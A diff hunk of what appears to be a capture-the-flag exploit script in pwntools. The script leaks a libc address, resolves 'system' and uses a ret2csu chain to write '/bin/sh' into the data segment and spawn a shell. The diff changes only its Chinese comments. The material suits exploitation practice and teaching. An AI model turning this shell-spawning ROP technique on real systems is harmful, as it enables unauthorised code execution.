@@ -38,9 +38,9 @@ libc     = LibcSearcher('write', write)
 libcBase = write    - libc.dump('write')
 execve   = libcBase + libc.dump('system')
 
-# 在bss段写入execve的地址和/bin/sh
+# 在data段写入execve的地址和/bin/sh (bss空间不够)
 # 因为csu中调用函数使用的值是指针的值, 因此需要一个指向execve的指针
-# 因为rdi修改的是edi的值, 因此不能使用libc中的/bin/sh, 只能将/bin/sh写入较低地址的bss段
+# 因为rdi修改的是edi的值, 因此不能使用libc中的/bin/sh, 只能将/bin/sh写入较低地址的data段
 csu(data, 0, 0, gets_got, vuln)
 p.sendline(p64(execve) + b'/bin/sh' + b'\0')
 
